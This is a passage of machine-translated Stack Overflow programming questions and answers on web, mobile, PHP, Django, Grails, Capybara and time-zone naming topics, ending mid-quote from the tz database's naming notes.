编辑：我刚刚发现的东西。width 属性似乎被覆盖了。设置时`width = 2000`（非常高），启用点赞按钮时（用户未连接/不喜欢），按钮确实`2000px`很宽，但是当连接了以前喜欢的用户时，您可以在那里看到 2000px 宽度，然后它再次“崩溃”。

EDIT2：我似乎找到了罪魁祸首，但我不知道为什么以及如何解决它。似乎在 facebook 上切换按钮中生成的代码将宽度设置为 72 而不是 100。

为启用按钮生成的代码：

```
<div class="fb-like fb_edge_widget_with_comment fb_iframe_widget" data-href="http://mysite.com" data-send="false" data-layout="button_count" data-width="100" data-show-faces="false" data-font="arial">
<span style="height: 20px; width: 100px;"> 
```

为喜欢（禁用）按钮生成的代码：

```
<div class="fb-like fb_edge_widget_with_comment fb_iframe_widget" data-href="http://mysite.com" data-send="false" data-layout="button_count" data-width="100" data-show-faces="false" data-font="arial">
<span style="height: 21px; width: 72px;"> 
```

任何帮助将非常感激。谢谢！

![在此处输入图像描述](../Images/15467b50a8b54ca259aeb245bee65117.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T20:11:58.240

好吧，我最终将它添加到我的 CSS 中：

```
div.fb-like > span {
min-width:100px;
} 
```

可能不是最好的方法，但它现在正在工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-10T02:50:08.630

你可以尝试使用

```
<div style="width: 100px;"></div> 
```

环绕您的代码。通常插件会在页面加载时自动适应其父元素的宽度。

如果父元素的宽度小于你的数据宽度，它可能会导致你的 Facebook 按钮缩小。这可能是您的按钮大小发生变化的原因。

# desire2learn - 如何在 D2L Basic LTI 中为自定义参数分配动态值

> ID：12009630
> 
> 赞同：1
> 
> 时间：2012-08-17T16:29:46.630
> 
> 标签：desire2learn, lti

在“管理外部学习工具”中，D2L 提供了定义自定义 LTI 参数的能力。我创建了这样一个参数，现在我想在将请求发布到第 3 方提供商之前通过 JavaScript 为客户参数分配一个动态值。

例如，为 user_id LTI 参数分配了仅 D2L 的用户 ID 值，该值与校园范围的身份验证不一致。但是，可以通过 JavaScript 获取校园范围的用户 ID，我想将其分配给自定义 LTI 参数，如 custom_campus_user_id。

先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T13:37:57.763

如果您进入组织的外部学习工具，并进入设置 (v10) 或配置工具消费者信息 (v9.2 – v9.4.1)，则有三个复选框允许在 LTI 中传递 D2L 定义的用户字段链接为自定义参数。它似乎是包含您要查找的值的系统用户名。

![LTI 配置页面](../Images/60fe381819aca62a97af054584bab9a9.png)

# php - 如何将 URL 指向页面？

> ID：12009633
> 
> 赞同：2
> 
> 时间：2012-08-17T16:29:59.747
> 
> 标签：php, javascript, html, .htaccess

我在 Wordpress 中看到，当您创建一个说“注册”的页面时，它指向[http://example.com/register/](http://example.com/register/)但根目录中根本没有一个名为 register 的文件夹。这是怎么做到的？

就像这样。当用户点击[http://example.com/index.php](http://example.com/index.php)上的注册链接时，它会将用户带到一个新页面，浏览器中的 URL 将是[http://example.com/register/](http://example.com/register/)并且页面加载。`register`文件夹本身不存在。

从下面的答案中，我了解到请求是通过 index.php 通过修改`.htaccess`

我想知道要放置什么代码，`index.php`以便[http://example.com/register/](http://example.com/register/)显示注册页面。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:34:06.673

在我的 Wordpress .htaccess 文件中，我有：

```
 RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule . /index.php [L] 
```

这基本上是说如果 URL 的“文件名”部分不作为文件`!-f`存在或作为目录存在，`!-d`则在内部将请求重写为`/index.php`强制请求由`index.php`Wordpress 处理。

好的，根据您的其他评论，以下`.htaccess`规则将采用`http://domain.com/<anything>`并在内部将其重写为`http://domain.com/index.php?page=<anything>`，这将在不考虑大小写（`NC`标志）的情况下完成，并将保留（预先挂起）任何现有的查询字符串（`QSA`标志）。这只对服务器上不存在的文件名和目录执行此操作。

```
 RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^(.*)$ /index.php?page=$1 [NC,QSA,L] 
```

这确实具有以下副作用，您应该能够以编程方式处理，`http://domain.com/register/`将被重写为`http://domain.com/index.php?page=register/`包括尾随的“/”，因为这是一个目录引用。同样，您应该能够在您的 PHP 代码中处理它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:45:09.210

当 Web 服务器（在本例中为 Apache）尝试打开请求的文件路径时，`/register/`在本例中，它首先查看该`.htaccess`文件。

该`.htaccess`文件以及许多其他内容可以将请求重定向到另一个路径。

通常发生的情况是所有请求都重定向到 WordPress 中的单个文件，`index.php`该文件读取原始请求`/register/`，并提供正确的 html。

WordPress 为提供正确的 html 所做的工作完全是另一个问题，但您可以从这里开始：[https ://www.google.com/search?q=how+wordpress+works](https://www.google.com/search?q=how+wordpress+works)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:34:19.637

Wordpress 在 .htaccess 文件中使用 mod_rewrite 如下：

```
# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>

# END WordPress 
```

如果文件或目录不存在且脚本不是 index.php，则通过 index.php 路由所有页面请求

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T16:49:05.040

尼尔马丁，这真的不是一个简单的问题。你最好阅读一些关于[URL REWRITING的好材料](http://www.cyberdesignz.com/blog/website-design/url-rewriting-top-5-ways-of-php-url-rewriting/)

# actionscript-3 - 在 Flash Professional 中向movieClip 实例添加动态变量

> ID：12009637
> 
> 赞同：0
> 
> 时间：2012-08-17T16:30:28.320
> 
> 标签：actionscript-3, flash, actionscript

我在Flash 的舞台上有许多movieClip 实例。我希望能够为每个变量添加一个动态变量。例如，我想给每个实例编号。

我尝试为每个实例指定一个实例名称（例如 box1、box2）并在 layer 1 > frame 1 代码窗口中编写以下代码

```
box1.number = 1;
box2.number = 2; etc. 
```

或者

```
box1["number"] = 1;
box2["number"] = 2; 
```

但是当试图在 Flash builder 中访问它们时，这些变量是未定义的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:51:22.780

您应该为所有要扩展的movieClips 创建一个自定义类（用作基类）。如果您不知道如何执行此操作，请在 .fla 目录的根目录中创建以下 MyCustomClassName.as 文件。

```
package {

    public class MyCustomClassName extends Sprite {  //use MovieClip is your box makes use of the timeline
        public var myNumber:int = 0;

        public function MyCustomClassName(num:int = 0) {
            myNumber = num;
        }
    }
} 
```

然后在您的盒子对象上，在库中右键单击它并调出属性/链接。将基类设置为自定义类 .as 文件的路径

您可以保持一切不变，现在您的盒子将继承该基类中的所有属性和功能。

```
myBoxInstance.myNumber = 5; 
```

或者如果通过代码实例化：

```
var box:MyCustomClassName = new MyCustomClassName(5);   //creates a new box giving it the number 5 
```

# ios - iPad 模拟器出错，但 iPhone 没有

> ID：12009641
> 
> 赞同：0
> 
> 时间：2012-08-17T16:30:45.010
> 
> 标签：ios, ios5, uistoryboardsegue

我有一个我喜欢这样的segue：

```
[self performSegueWithIdentifier:@"PlanToBusiness" sender:self]; 
```

它适用于 iPhone，但不适用于 iPad。我所做的是对服务器进行远程调用，当服务器响应正确返回时，我尝试使用该 segue 将用户带到新页面。

它适用于 iPhone 模拟器，但不适用于 iPad（两者的标识字符串相同），在 iPad 上它会因以下错误而崩溃：

```
bool _WebTryThreadLock(bool), 0x68f9cb0: Tried to obtain the web lock from a thread other than the main thread or the web thread. This may be a result of calling to UIKit from a secondary thread. Crashing now...
1   WebThreadLock
2   -[UITextRangeImpl isEmpty]
3   -[UITextRange(UITextSelectionAdditions) _isCaret]
4   -[UITextSelectionView setCaretBlinks:]
5   -[UIKeyboardImpl setCaretBlinks:]
6   -[UIKeyboardImpl setDelegate:force:]
7   -[UIKeyboardImpl setDelegate:]
8   -[UIPeripheralHost(UIKitInternal) _reloadInputViewsForResponder:]
9   -[UINavigationController navigationTransitionView:didStartTransition:]
10  -[UINavigationTransitionView transition:fromView:toView:]
11  -[UINavigationTransitionView transition:toView:]
12  -[UINavigationController _startTransition:fromViewController:toViewController:]
13  -[UINavigationController _startDeferredTransitionIfNeeded]
14  -[UINavigationController pushViewController:transition:forceImmediate:]
15  -[UINavigationController pushViewController:animated:]
16  -[UIStoryboardPushSegue perform]
17  -[UIStoryboardSegueTemplate perform:]
18  -[UIViewController performSegueWithIdentifier:sender:]
19  __41-[PlanBusinessController submitBusiness:]_block_invoke_0
20  __block_global_0
21  -[NSBlockOperation main]
22  -[__NSOperationInternal start]
23  -[NSOperation start]
24  __block_global_6
25  _dispatch_call_block_and_release
26  _dispatch_worker_thread2
27  _pthread_wqthread
28  start_wqthread 
```

我也不太习惯阅读 Obective-C 堆栈跟踪，所以我很难确定问题所在。

这是我如何做到的：

```
- (IBAction)submitBusiness:(id)sender 
{    
     // Make a url to send

     NSURL *url = [NSURL URLWithString:full_encoded_url_string];
     NSURLRequest *urlRequest = [NSURLRequest requestWithURL:url];

        // ***************
        // TODO: ok I dont really understand what this is
        NSOperationQueue *queue = [[NSOperationQueue alloc] init];
        // **************

        [NSURLConnection sendAsynchronousRequest:urlRequest queue:queue completionHandler:^(NSURLResponse *response, NSData *data, NSError *error)
         {   
                         // I took out a lot of the logic code that is not needed

                         [self performSegueWithIdentifier:@"PlanToBusiness" sender:self];
         }];
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T17:02:38.910

当方法接触 UI 时，例如执行 segue 时，确保从主线程调用该代码很重要。最简单的方法是制作这样的方法：

```
- (void)performPlanToBusinessSegueOnMainThread
{
    [self performSegueWithIdentifier:@"PlanToBusiness" sender:self];
} 
```

然后，您可以在完成的块中调用此方法，如下所示：

```
[NSURLConnection sendAsynchronousRequest:urlRequest queue:queue completionHandler:^(NSURLResponse *response, NSData *data, NSError *error)
 {   
     // I took out a lot of the logic code that is not needed

     [self performSelectorOnMainThread:@selector(performPlanToBusinessSegueOnMainThread) 
                            withObject:nil 
                         waitUntilDone:YES];
 }]; 
```

这有点迂回，但它应该可以解决您的异常。如果我们可以只调用`performSegueWithIdentifier`该`performSelectorOnMainThread`方法会更好，但是它的参数太多了。

# android - ListView 动画单个项目

> ID：12009642
> 
> 赞同：13
> 
> 时间：2012-08-17T16:30:45.423
> 
> 标签：android, listview, animation

我有一个包含项目的 ListView。当用户单击一个项目时，它的高度应该缩放为零，并且下面的所有项目都应该向上滚动。我下面的代码不起作用。使用我的代码，单击的项目向右缩放，但下面的项目不会向上滚动，它们保持在同一位置。我也用 LinearLayout 试过，但也有同样的问题。

有一个应用程序可以做到这一点。它被称为[任务](https://play.google.com/store/apps/details?id=ch.teamtasks.tasks&feature=more_from_developer#?t=W251bGwsMSwxLDEwMiwiY2gudGVhbXRhc2tzLnRhc2tzIl0.)。

![这张小图应该能说明问题](../Images/73087ab1807642fe7c1e1ff16816a5e6.png)

我当前的实现如下所示：

```
@Override
public void onItemClick(AdapterView<?> arg0, View v, final int index,
        long id) {
    Animation anim = AnimationUtils.loadAnimation(getActivity(),
            R.anim.scaleup);
    v.startAnimation(anim);
} 
```

```
<set android:shareInterpolator="false" >
    <scale
        android:duration="700"
        android:fillAfter="false"
        android:fillBefore="false"
        android:fromXScale="1.0"
        android:fromYScale="1.0"
        android:interpolator="@android:anim/accelerate_decelerate_interpolator"
        android:pivotY="0%"
        android:toXScale="1.0"
        android:toYScale="0.0" />
</set> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-17T18:14:38.820

这是我制作的一个类（根据[我在此处找到的源代码](https://stackoverflow.com/questions/4946295/android-expand-collapse-animation)进行了修改），它可能会为您提供所需的功能。

```
public class FadeUpAnimation extends Animation {

int mFromHeight;
View mView;

public FadeUpAnimation(View view) {
    this.mView = view;
    this.mFromHeight = view.getHeight();
}

@Override
protected void applyTransformation(float interpolatedTime, Transformation t) {
    int newHeight;
    newHeight = (int) (mFromHeight * (1 - interpolatedTime));
    mView.getLayoutParams().height = newHeight;
    mView.setAlpha(1 - interpolatedTime);
    mView.requestLayout();
}

@Override
public void initialize(int width, int height, int parentWidth,
        int parentHeight) {
    super.initialize(width, height, parentWidth, parentHeight);
}

@Override
public boolean willChangeBounds() {
    return true;
}
} 
```

然后这就是我使用它的方式

```
View tv = ...
Animation a = new FadeUpAnimation(tv);
a.setInterpolator(new AccelerateInterpolator());
a.setDuration(300);
tv.setAnimation(a);
tv.startAnimation(a); 
```

您可以使用它来查看是否可以满足您的需求。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-17T18:04:45.630

你会再次使用点击的项目吗？如果没有，那么你可以

1.  等到动画结束
2.  从存储底层数据的任何位置删除项目
3.  然后调用 listadapter 的 notifyDataSetChanged() 方法

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T17:33:40.937

Android 不像 HTML，当您更改视图中的宽度、高度或可见性时，其他视图不会更新它们的位置。如果您需要这样做，您必须单独更新所有列表视图和您的内部视图。这是一个复杂的代码。

# grails - Grails：如何为多个列创建命名唯一约束？

> ID：12009647
> 
> 赞同：4
> 
> 时间：2012-08-17T16:30:58.267
> 
> 标签：grails, constraints, grails-orm, unique-constraint, grails-domain-class

如何为多个列创建命名唯一约束？

我有三门课：

```
class Descriptor {
    // some columns
}

class Protein {
    // some columns
}

class DescriptorValue {
    // some columns
    static belongsTo = [protein: Protein, descriptor: Descriptor]
    static constraints = {
        protein(unique:['descriptor'])
    }
} 
```

GORM 创建一个具有不同环境的自动生成名称的索引。如何指定它的名称？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:50:58.070

尝试这样做：

```
static mapping = {
    protein unique:['descriptor'], index: 'protein_idx' //or whatever name you like
} 
```

如果您需要使用多列索引，则可以为每个属性指定相同的索引名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-26T11:00:15.827

```
String field1
String field2
Integer field3
SomeObject object

  static constraints = {
        object unique: ['field1','field2', 'field3']
    } 
```

# jquery - JQuery 将选择扩展到完整的标签内容

> ID：12009650
> 
> 赞同：-1
> 
> 时间：2012-08-17T16:31:04.920
> 
> 标签：jquery

我在文本区域内的双括号中包含一些“标签”，例如：

```
Hello {{name}}, welcome to {{place}} 
```

我试图弄清楚如何做到这一点，以便如果我单击标记的双括号内的任何位置，我可以让它扩展选择以包含括号内的所有文本，然后能够使用该选择在 JQuery 中。

换句话说，如果我只是单击标签 {{name}} 中的任意位置，它将获得完整的标签文本“名称”，而无需选择整个内容。

解决此问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T17:03:37.767

我准备了以下小提琴，在里面点击时会选择你的“标签”。

[http://jsfiddle.net/zD8tc/](http://jsfiddle.net/zD8tc/)

# php - SoapClient::SomeFunction 到 SoapClient::__soapCall('SomeFunction')

> ID：12009651
> 
> 赞同：2
> 
> 时间：2012-08-17T16:31:10.880
> 
> 标签：php, soap, soap-client

`WSDL`我以这种方式向服务器发送请求：

```
$soap = new SoapClient('WSDL_URI');
$soap->SomeFunction(array('Param1' => 123, 'Param2' => 456)); 
```

它工作正常，并`__getLastRequest`返回：

```
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://tempuri.org/">
    <SOAP-ENV:Body>
        <ns1:SomeFunction>
            <ns1:Param1>123</ns1:Param1>
            <ns1:Param2>456</ns1:Param2>
        </ns1:SomeFunction>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope> 
```

但是如果我调用`SomeFunction`by `__soapCall`，`WSDL`服务器会停止并且不会返回正确的响应。

```
$soap->__soapCall('SomeFunction', array('Param1' => 123, 'Param2' => 456)); 
```

`__getLastRequest`返回：

```
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://tempuri.org/">
    <SOAP-ENV:Body>
        <ns1:SomeFunction/>
        <param1>123</param1>
        <param2>456</param2>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope> 
```

你看，因为请求不同，它不起作用..

如何解决？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-17T16:54:23.590

如 php 文档[SoapClient::__soapCall 所示](http://php.net/manual/fr/soapclient.soapcall.php)，

```
 $client = new SoapClient("some.wsdl");

    $client->SomeFunction($a, $b, $c);
    // Or    
    $client->__soapCall("SomeFunction", array($a, $b, $c)); 
```

所以我认为如果你想用 调用网络服务`__soapCall`，你应该这样调用：

```
$soap->__soapCall('SomeFunction', array(array('Param1' => 123, 'Param2' => 456))); 
```

# google-apps-script - How do I convert a string to a date in Apps-Script

> ID：12009655
> 
> 赞同：4
> 
> 时间：2012-08-17T16:31:22.927
> 
> 标签：google-apps-script, google-apps

I'm having some problems getting a date string (such as "17/08/2012") to a date so that it can be used to compare another date.

I would like "17/08/2012" to produce the date "17/08/2012 00:00:00 GMT" so that it can be used correctly for comparison. I thought this would be the easiest part of what I'm trying to do, but apparently not. Please see my current code below.

```
function dateToString(dateString) {
  var dateArray = dateString.split("/");
  var year = dateArray[2];
  var month = dateArray[1];
  var day = dateArray[0];
  var date = new Date(year, month - 1, day);

  return date;
} 
```

This code currently produces "Fri Aug 17 16:00:00 PDT 2012" and I have absolutely no idea why it says 4pm. I have been trying loads of different ways of doing this for the past hour and still cannot seem to get it right. Any ideas how I can get it to convert correctly?

As always any help is much appreciated.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T17:17:13.110

Your code is correct. 16 h PDT is the time in Pacific time zone, if I'm right that's 9 hours ahead of GMT. You should check the time zone settings of the script and of the spreadsheet so all operations on dates will be ok . Just keep in mind that the logger sometimes shows PDT value even when settings are good (at least it happened to me quite often in the past...) You can always choose how you display date objects by using `Utilities.formatDate()`

For more info on date object have a look [at this reference page](http://www.w3schools.com/jsref/jsref_obj_date.asp)

# django - 将查询集结果插入多对多字段

> ID：12009658
> 
> 赞同：4
> 
> 时间：2012-08-17T16:31:32.323
> 
> 标签：django

我有一个如下所示的 models.py 文件：

```
from django.db import models
from common.models import Record
from tinymce import models as tinymce_models

# Create your models here.
class Address(Record):
    def __unicode__(self):
        return unicode(self.ip)

    ip = models.IPAddressField(unique=True)
    notes = models.TextField(blank=True)

    class Meta:
        verbose_name_plural = "Addresses"

class Servers(models.Model):
    def __unicode__(self):
        return unicode(self.server_name)

    server_name = models.CharField(max_length=100)
    ip_address = models.ForeignKey(Address)
    secondary_ips = models.ManyToManyField(Address, verbose_name = 'Secondary IPs', blank=True, related_name='secondary_ips')

    class Meta:
        verbose_name_plural = "Servers" 
```

我有系统中的 IP 和服务器列表。我试图让 ManytoManyField 仅显示当前未与服务器关联的 IP 列表。

我有以下查询集：

```
inner_qs = Servers.objects.values_list('ip_address_id', flat=True)
entries = Address.objects.exclude(id__in=inner_qs) 
```

它只返回不在服务器表中的 IP 地址。我不知道如何将这些结果合并到我的 ManytoManyField 以及我应该放置查询集的位置。我目前只有在进入 django Shell 时才能得到结果

有任何想法吗，

谢谢

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2015-08-28T08:10:55.513

如果要将查询集添加到多对多字段，请首先将其更改为列表并使用 * 将其添加为位置参数

例子

```
# Returns a queryset
permissions = Permission.objects.all()

# Add the results to the many to many field (notice the *)

group = MyGroup.objects.get(name='test')

group.permissions.add(*permissions) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-05-21T07:18:24.920

返回一个查询集

```
permissions = Permission.objects.all() 
```

将结果添加到多对多字段（注意`*`）

```
group = MyGroup.objects.get(name='test')
group.permissions.add(*permissions) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-18T00:08:13.410

您可以在此处使用此答案：[Filter ManyToMany box in Django Admin](https://stackoverflow.com/questions/1226760/filter-manytomany-box-in-django-admin)

简而言之，您需要创建一个扩展的自定义表单`django.forms.ModelForm`。在那里，在`__init__`-method 中，将新选项放置到正确的小部件 ( `secondary_ips`) 中。最后，添加`form = YourOwnForm`到`ServerAdmin`您正在使用的类。

我建议`related_names`在`Servers`-model中修改：

```
class Servers(models.Model):
    # ...
    ip_address = models.ForeignKey(Address, related_name='server')
    secondary_ips = models.ManyToManyField(Address, verbose_name = 'Secondary IPs', \
        blank=True, related_name='servers_secondary') 
```

然后，您可以使用一个不错的 QuerySet：

```
allowed_addresses = Address.objects.filter(server=None) 
```

**次要地址**

当然，这只会过滤某些服务器中作为主 IP 的 IP。如果您还想过滤掉其他服务器中作为 secondary_ip 的 ip，事情会变得有点棘手：

您还需要在`servers_secondary=None`. 但是您不能过滤掉为当前对象（在管理员中编辑的服务器）选择的 IP，否则这些选定的 IP 也会消失。

[使用Q 对象](https://docs.djangoproject.com/en/dev/topics/db/queries/#complex-lookups-with-q-objects)完成此操作，并从中获取当前选定的对象`kwargs`。您的自定义表单的`__init__`-method 将如下所示：

```
def __init__(self, *args, **kwargs):
    super(YourOwnForm, self).__init__(*args, **kwargs)
    instance = kwargs.get('instance')
    allowed_addresses = Address.objects \
        .filter(server=None) \
        .filter(Q(servers_secondary=None) | Q(servers_secondary=instance))
    choices = []
    for choice in allowed_addresses:
        choices.append((choice.id, choice.ip))
    w = self.fields['secondary_ips'].widget
    w.choices = choices 
```

**主要地址下拉菜单**

按照同样的方法，也可以在主 IP 地址下拉菜单中过滤项目。当然，必须注意不要从列表中删除选定的 IP 地址。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-02-20T03:01:31.313

我来到这里是因为我有一个模型，其中有一个指向这个模型“CampaignsProducts”的模型，它的**str**属性正在生成许多查询：

前 ：

```
class CampaignsProducts(mdlcom.CommonStructure):
 product = models.ForeignKey(
    'products.Product',
    verbose_name=u'Producto',
    null=False, on_delete=models.CASCADE,
    related_name="%(app_label)s_%(class)s_product_set",
 )
 campaign = models.ForeignKey(
    'prices.Campaigns',
    verbose_name=u'Campaña',
    null=False, on_delete=models.CASCADE,
    related_name="%(app_label)s_%(class)s_campaign_set",
 )
 def __str__(self):
    return '{} - {}'.format(self.product.name, self.campaign.name) 
```

为了修复它，我更改了以下“ **str** ”属性

```
def __str__(self):
   return str(self.id) 
```

Mikko 提供的解决方案挽救了我的生命：

```
class CouponForm(forms.ModelForm):
NO_REQUIRED = [
    'sellers', 'platforms', 'campaigns_product',
]

class Meta:
    model = mdlpri.Coupon
    fields = '__all__'

def get_campaigns_choices(self):
    qscampaigns = (
        mdlpri.CampaignsProducts.objects.all()
        .select_related("product")
        .select_related("campaign")
        .order_by("id")
    )
    choices = []
    for item in qscampaigns:
        wdescription = '{} - {}'.format(
            item.product.name, item.campaign.name
        )
        choices.append((item.id, wdescription))

    return choices

def __init__(self, *args, **kwargs):
    super(CouponForm, self).__init__(*args, **kwargs)
    for wfield in self.NO_REQUIRED:
        self.fields[wfield].required = False 
```

> # 个性化选择
> 
> ```
>  w = self.fields["campaigns_product"].widget
>     w.choices = self.get_campaigns_choices() 
> ```

变更前查询（按产品）：

```
SELECT "products_product"."id", "products_product"."name", "products_product"."custom", "products_product"."created_at", "products_product"."updated_at", "products_product"."active", "products_product"."position", "products_product"."url", "products_product"."for_bonus_platform", "products_product"."for_cms_platform", "products_product"."for_store_platform", "products_product"."for_call_center_platform", "products_product"."for_ibk_platform", "products_product"."for_scotiabank_platform", "products_product"."for_bbva_platform", "products_product"."for_refurbished_platform" FROM "products_product" WHERE "products_product"."id" = 1 
```

更改后查询：

```
SELECT "prices_campaignsproducts"."id", "prices_campaignsproducts"."date_created_at", "prices_campaignsproducts"."created_at", "prices_campaignsproducts"."updated_at", "prices_campaignsproducts"."user_id", "prices_campaignsproducts"."last_user_modified_id", "prices_campaignsproducts"."product_id", "prices_campaignsproducts"."campaign_id", "prices_campaignsproducts"."price", "prices_campaignsproducts"."is_active", "prices_campaignsproducts"."expiration_from", "prices_campaignsproducts"."expiration_to", "products_product"."id", "products_product"."name", "products_product"."custom", "products_product"."created_at", "products_product"."updated_at", "products_product"."active", "products_product"."position", "products_product"."url", "products_product"."for_bonus_platform", "products_product"."for_cms_platform", "products_product"."for_store_platform", "products_product"."for_call_center_platform", "products_product"."for_ibk_platform", "products_product"."for_scotiabank_platform", "products_product"."for_bbva_platform", "products_product"."for_refurbished_platform", "prices_campaigns"."id", "prices_campaigns"."date_created_at", "prices_campaigns"."created_at", "prices_campaigns"."updated_at", "prices_campaigns"."user_id", "prices_campaigns"."last_user_modified_id", "prices_campaigns"."name", "prices_campaigns"."is_active" FROM "prices_campaignsproducts" INNER JOIN "products_product" ON ("prices_campaignsproducts"."product_id" = "products_product"."id") INNER JOIN "prices_campaigns" ON ("prices_campaignsproducts"."campaign_id" = "prices_campaigns"."id") ORDER BY "prices_campaignsproducts"."id" ASC 
```

只是想分享我的经验。

最好的祝福，

# android - 如何在 Android 的默认浏览器中删除 Web SQL 数据库？

> ID：12009661
> 
> 赞同：0
> 
> 时间：2012-08-17T16:31:41.497
> 
> 标签：android, mobile, web-sql, offlineapps

这是一个网络 sql 浏览器。我猜他们最近切换到 chrome，所以在较新的版本中，这可能是 idb 的问题，但这个问题出在 web sql 上。

设置 > 隐私和安全 > 清除缓存（清除本地缓存的内容和数据库）不起作用。我知道这一点，因为在运行相同的测试 10 次后，我终于将数据库的名称从 abc 更改为 def 并且它起作用了。我也知道这一点，因为即使在清除缓存后我也可以访问旧数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:36:51.307

nm，显然您可以在设备级别的设置中执行此操作。它也擦掉了我所有的书签。有人知道摆脱数据库的方法吗？

# ruby-on-rails - Capybara为什么看不到这个页面的内容？

> ID：12009664
> 
> 赞同：4
> 
> 时间：2012-08-17T16:31:58.320
> 
> 标签：ruby-on-rails, rspec, capybara

我正在尝试使用 Capybara 编写 Rspec 请求规范。似乎一切正常，**除了**Capybara 将页面视为空白。

好兆头：

*   页面在浏览器中加载正常
*   拖尾日志显示在测试运行期间呈现了正确的视图
*   我在视图中放置的任何日志记录语句都会被执行
*   如果我使用`assert_select "h1", :text => "hello world"`，则测试通过。

不良迹象：

*   如果我使用`page.should have_content('hello world')`，它会失败，说`Capybara::ElementNotFound: Unable to find xpath "/html"`
*   如果我这样做`$stdout.puts page.html`，它是空的，除了一个文档类型

我的测试看起来像这样：

```
describe "working with foos" do
  it "should have a 'new foo' form" do
    get '/foos/new'
    assert_select 'h1', text: 'hello world' # passes
    page.should have_content('hello world') # fails
    $stdout.puts page.html                  # empty except for a doctype
  end
end 
```

这里有什么问题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-17T16:32:14.607

# 打额头的回答

...我正在分享以拯救其他人同样的痛苦。

Capybara 使用该`visit`方法设置其页面变量。

```
visit '/assembly/manage/task_lists/new' 
```

不要`get`与 Capybara 一起使用：

```
get '/assembly/manage/task_lists/new' 
```

# timezone - 为什么 tzinfo 使用城市时区而不是区域时区？

> ID：12009668
> 
> 赞同：4
> 
> 时间：2012-08-17T16:32:18.093
> 
> 标签：timezone, tzinfo

这个问题与 tzinfo aka Olson Timezone Database 中的标准时区列表有关。

示例 1：我注意到使用 America/New_York 或 America/Detroit（被称为“示范城市”，参见[http://www.w3.org/International/docs/timezones/#tzids](http://www.w3.org/International/docs/timezones/#tzids)）而不是 US/Eastern。

示例 2：在加拿大，Mountain 时区通常被描述为 America/Edmonton 而不是 Canada/Mountain。不列颠哥伦比亚省的部分地区处于山区时间，但它们的时区被指定为美国/埃德蒙顿（位于阿尔伯塔省）。

在这些情况下，为什么要使用区域/示例城市选项而不是国家/地区版本？首先创建国家/地区版本肯定是有原因的，但是如果它不是首选方式，为什么会存在呢？

当一个国家有多个时区时，这主要是一个问题。

某处是否有最佳实践说明为什么一个比另一个更受欢迎？

（PS 这对谷歌来说是一个难题，因为你得到了所有不相关或无用的结果。我能找到的最接近的是[夏令时和时区最佳实践](https://stackoverflow.com/questions/2532729/daylight-saving-time-and-timezone-best-practices)，但它没有解决这个问题。）

编辑：[2个时区可以代表1个城市吗？](https://stackoverflow.com/questions/2234121/can-2-timezone-be-for-1-city)有“因为不是每个人都使用规范的大陆/城市表示法作为他们的时区（例如，我倾向于使用旧的美国/太平洋表示法 - 它仍然受支持，但相当于 America/Los_Angeles）。” 他关于“美国/太平洋”较旧的断言与我的间接假设相矛盾，即它较新，但仍然不是答案。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T19:48:36.033

`Theory`随 Olson 数据库分发的文件包含以下信息：

## 时区规则文件的名称

时区规则文件命名约定试图在以下目标之间取得平衡：

*   唯一标识自 1970 年以来所有时钟一致的每个国家地区。这对于预期用途至关重要：保持当地民用时间的静态时钟。

*   向人类指示该区域的位置。这简化了 [*原文如此*] 的使用。

*   在存在政治变化的情况下保持稳健。这减少了更新和向后兼容黑客的数量。例如，通常不使用国家名称，以避免在国家更改名称（例如扎伊尔⟶刚果）或地点更改国家（例如香港从英国殖民地到中国）时出现不兼容。

*   可移植到各种实现。这促进了该技术的使用。

*   在全球范围内使用一致的命名约定。这简化了使用和维护。

此命名约定不适用于没有经验的用户自行选择 TZ 值（尽管他们当然可以检查和重用现有设置）。分销商应提供说明名称的文件和/或简单的选择界面；例如，请参阅随此发行版提供的“tzselect”程序。

名称通常采用 AREA/LOCATION 形式，其中 AREA 是大陆或海洋的名称，LOCATION 是该区域内特定位置的名称。北美和南美共享同一地区，“美国”。典型名称是“Africa/Cairo”、“America/New_York”和“Pacific/Honolulu”。

以下是用于选择位置名称的一般规则，按重要性降序排列：

